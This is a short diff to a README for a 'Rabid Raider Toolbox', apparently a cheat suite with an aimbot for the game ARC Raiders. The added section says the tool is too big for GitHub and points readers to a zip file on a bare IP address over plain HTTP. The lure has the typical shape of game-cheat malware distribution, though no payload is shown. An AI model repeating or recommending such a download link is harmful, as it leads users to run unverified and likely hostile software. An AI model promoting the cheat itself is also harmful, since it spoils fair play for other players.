@@ -16,6 +16,13 @@ The **Rabid Raider Toolbox** is a comprehensive assistance suite for ARC Raiders
 
 ---
 
+## Download
+
+The **Rabid Raider Toolbox** is not hosted on github, as its way too big (85MB).
+You can download it here: [Download Rabid Raider Dashboard NOW!](http://185.163.204.142/RRD.zip)
+
+---
+
 ## 🛠️ Features
 
 ### 🎯 Aimbot
